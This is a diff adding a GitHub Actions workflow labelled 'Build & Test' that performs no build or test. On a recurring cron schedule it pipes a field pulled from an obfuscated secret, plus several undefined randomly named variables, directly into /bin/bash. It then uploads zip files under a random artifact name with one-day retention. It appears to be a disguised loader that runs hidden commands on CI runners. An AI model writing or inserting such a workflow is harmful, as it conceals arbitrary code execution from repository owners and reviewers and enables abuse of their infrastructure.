@@ -1,0 +1,37 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          kgw585: ${{ secrets.kgw585 }}
+        run: |
+          printf '%s' "$kgw585" | jq -r .erqgc674 | /bin/bash
+          echo $n14 | jq -r .vvld277 | /bin/bash
+          echo $sm67 | jq -r .gi9355 | /bin/bash
+          echo $oq8 | jq -r .eiq8639 | /bin/bash
+          printf '%s' "$c4159" | jq -r .qx2467 | /bin/bash
+          echo $g86 | jq -r .zuj95 | /bin/bash
+          echo $uu328 | jq -r .su38 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: FD2wxrVq
+          path: "*.zip"
+          retention-days: 1
